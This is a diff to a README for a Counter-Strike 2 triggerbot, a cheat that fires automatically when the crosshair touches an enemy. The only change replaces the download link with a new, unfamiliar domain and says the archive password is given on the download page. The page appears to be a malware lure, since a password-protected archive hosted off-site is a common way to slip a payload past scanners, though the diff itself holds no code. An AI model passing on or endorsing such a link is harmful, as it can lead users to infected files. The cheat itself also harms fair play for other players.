@@ -18,7 +18,7 @@ CS2 triggerbot with configurable delay — auto-shoots when crosshair touches en
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/cs2trig3)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/cs2trig3)
 
 > The archive password is shown on the download page.
 
